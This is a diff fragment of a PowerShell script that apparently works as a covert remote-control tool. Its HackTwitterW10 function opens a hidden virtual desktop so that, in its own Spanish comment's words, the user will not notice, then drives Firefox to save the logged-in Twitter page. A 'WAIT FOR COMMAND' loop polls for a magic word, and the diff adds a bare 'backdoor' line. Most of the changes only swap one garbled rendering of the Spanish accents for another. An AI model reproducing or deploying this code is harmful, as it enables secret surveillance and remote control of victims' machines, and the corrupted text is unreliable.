@@ -303,8 +303,8 @@ function mainBrowser {
 
 function HackTwitterW10 {
     <#
-    Crear· un nuevo dekstop virtual e iniciar· ahÌ el firefox y guardar· el html, como es un desktop virtual el usuario no se enterar· de lo que pasa
-    Esta funcion solo es v·lida para W10.
+    Crear–± un nuevo dekstop virtual e iniciar–± ah–Ω el firefox y guardar–± el html, como es un desktop virtual el usuario no se enterar–± de lo que pasa
+    Esta funcion solo es v–±lida para W10.
     Manuales: 
         https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
     #>
@@ -376,10 +376,10 @@ public static void SwitchRightVirtualDesktopInWin10()
     $wshell = New-Object -ComObject wscript.shell
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
 
-    # Espera 10 segundos a cargar completamente la p·gina
+    # Espera 10 segundos a cargar completamente la p–±gina
     Start-sleep -Seconds 10
 
-    # Activa la ventana con el nombre: 'Iniciar sesiÛn en Twitter'
+    # Activa la ventana con el nombre: 'Iniciar sesi—Én en Twitter'
     $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
     $wshell.AppActivate('twitter') 
     $wshell.SendKeys("^{s}") 
@@ -477,10 +477,10 @@ public static void SwitchRightVirtualDesktopInWin10()
     $wshell = New-Object -ComObject wscript.shell
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
 
-    # Espera 10 segundos a cargar completamente la p·gina
+    # Espera 10 segundos a cargar completamente la p–±gina
     Start-sleep -Seconds 10
 
-    # Activa la ventana con el nombre: 'Iniciar sesiÛn en Twitter'
+    # Activa la ventana con el nombre: 'Iniciar sesi—Én en Twitter'
     $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
     $wshell.AppActivate('Mozilla Firefox') 
     $wshell.SendKeys("^{s}") 
@@ -596,6 +596,8 @@ Invoke-WebRequest `
 ######################
 ## WAIT FOR COMMAND ##
 ######################
+
+backdoor
 
 #Time to sleep for each loop before checking if a message with the magic word was received
 $LoopSleep = 3
